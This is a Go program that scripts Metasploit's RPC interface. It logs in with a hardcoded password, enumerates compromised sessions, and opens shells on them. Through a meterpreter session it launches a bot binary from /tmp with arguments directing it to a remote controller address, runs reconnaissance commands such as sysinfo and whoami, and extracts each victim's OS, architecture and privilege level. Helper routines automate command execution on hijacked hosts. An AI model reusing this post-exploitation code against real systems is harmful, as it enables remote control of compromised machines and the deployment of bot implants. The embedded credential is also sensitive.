package main

import (
	"encoding/json"
	"fmt"
	"github.com/iami317/gomsf"
	"github.com/iami317/gomsf/rpc"
	"strings"
	"time"
)

type ExpInfo struct {
	Id         string   `json:"id"`
	Name       string   `json:"name"`
	VulId      string   `json:"vul_id"`
	VulCode    []string `json:"vul_code"`
	Tags       []string `json:"tags"`
	VulPort    string   `json:"vul_port"`
	CaseId     string   `json:"case_id"`
	ExecMethod int      `json:"exec_method"`
	PlatForm   []string `json:"plat_form"`
	Rank       string   `json:"rank"`
}

func (ei ExpInfo) String() string {
	bb, _ := json.Marshal(ei)
	return string(bb)
}

func main() {
	client, err := gomsf.New("127.0.0.1:55553")
	if err != nil {
		panic(err)
	}

	if err = client.Login("hz-msf", "79KsCyTqPizo0e3apj6M"); err != nil {
		panic(err)
	}
	defer client.Logout()
	//defer client.Session.SessionKill(3)
	sessionList, _ := client.Session.List()
	bb, _ := json.Marshal(sessionList)
	fmt.Println(string(bb))
	//client.Session.Write(3, "shell")
	//time.Sleep(time.Second * 5)
	//client.Session.Write(3, `whoami`)
	//time.Sleep(time.Second * 1)
	//str, err := client.Session.Read(3)
	//fmt.Println("str=>", str, "err=>", err)
	//str, err := ExecuteCommand(client, 3, "uname -a")
	//fmt.Println(str, err)
	//client.Session.Write(3, "execute -h")
	//fmt.Println(client.Session.Read(3))
	//return
	//for i := 0; i < 10; i++ {
	//	str, _ := client.Session.Read(3)
	//	fmt.Println("********", str)
	//	if strings.Contains(str, "Channel") && strings.Contains(str, "created.") {
	//		client.Session.Read(3)
	//		break
	//	}
	//	if strings.Contains(str, "shell: not found") {
	//		client.Session.Read(3)
	//		break
	//	}
	//}
	//fmt.Println("--------shell created.")
	//client.Session.Write(3, "uname -a")
	//fmt.Println(client.Session.Read(3))
	//defer func() {
	//	_, _ = client.Session.SessionKill(3)
	//	fmt.Println("SessionKill")
	//}()
	//fmt.Println(client.Session.RunSingle(3, "sysinfo"))
	//time.Sleep(time.Second * 2)
	//fmt.Println(client.Session.Read(3))
	//return
	/*
		client.Session.SessionKill(3)
	*/
	fmt.Println(client.Session.RunSingle(4, `execute -f /tmp/bot_linux_x86_64 -a "-sh 192.168.100.145 -av 11111111 -tid 145"`))
	time.Sleep(time.Second * 5)
	fmt.Println(client.Session.Read(4))
	return

	str, err := command(client, 4, "shell", "\n")
	if strings.Contains(str, `created.`) || strings.Contains(str, "shell: not found") {
		defer client.Session.SessionKill(4)
		fmt.Println("shell 创建成功")
	} else {
		fmt.Println("shell 创建失败", str, err)
		return
	}

	str, err = command(client, 4, "sysinfo", "\n")
	fmt.Println(err)
	fmt.Printf("%#v", str)
	return

}

func command(client *gomsf.Client, sid int, cmd string, endStrs string) (string, error) {
	err := client.Session.Write(sid, cmd)
	//fmt.Println(sid, cmd, err)
	if err != nil {
		return "", err
	}
	timeout := 20
	counter := 1
	out := ""
	for range time.Tick(time.Second) {
		if counter >= timeout {
			return "", fmt.Errorf("命令执行超时")
		}
		outStr, _ := client.Session.Read(sid)
		out += outStr
		fmt.Printf("-----%#v => %v\n", out, counter)
		if strings.Contains(out, "Unknown command") {
			return out, fmt.Errorf("命令执行失败")
		}

		if len(endStrs) == 0 {
			//fmt.Println("****")
			if len(out) > 0 {
				return out, nil
			}
		} else {
			if strings.Contains(outStr, endStrs) {
				return strings.TrimRight(out, "\n"), nil
			}
		}
		counter += 1
	}
	return "", fmt.Errorf("命令执行超时.")
}

func ExecuteCommand(client *gomsf.Client, sessionId uint32, command string) (string, error) {
	for range time.Tick(400 * time.Millisecond) {
		_ = client.Session.Write(int(sessionId), command)
		str, _ := client.Session.Read(int(sessionId))
		if len(str) > 0 {
			//fmt.Println("*******", str)
			if strings.Contains(str, "Unknown command") {
				_ = client.Session.Write(int(sessionId), "shell")
			} else if strings.Contains(str, "shell: not found") {
				splits := strings.Split(str, "\n")
				var s string
				for _, split := range splits {
					//fmt.Println("*******", split)
					if !strings.Contains(split, "shell: not found") {
						s += fmt.Sprintf("%v\n", split)
					}
				}
				return strings.TrimRight(s, "\n"), nil
			} else {
				return str, nil
			}
		}
	}
	return "", nil
}

func getSessionInfo(exploitUuid string, sessionList rpc.SessionListRes) (sid uint32, os string, arch string, authority string) {
	for sessionId, data := range sessionList {
		if data.ExploitUUID == exploitUuid {
			sid = sessionId
			if len(data.Platform) > 0 && len(data.Arch) > 0 {
				if data.Platform == "linux" || data.Platform == "unix" {
					os = "Linux"
				} else if data.Platform == "windows" {
					os = "Windows"
				}

				if data.Arch == "x64" {
					arch = "x86_64"
				} else {
					arch = "arm64"
				}
			} else {
				os = "Linux"
				arch = "x86_64"
			}

			if len(data.Info) > 0 {
				infos := strings.Split(data.Info, "@")
				authority = strings.Trim(infos[0], " ")
			}

			return sessionId, os, arch, authority
		}
	}
	return
}
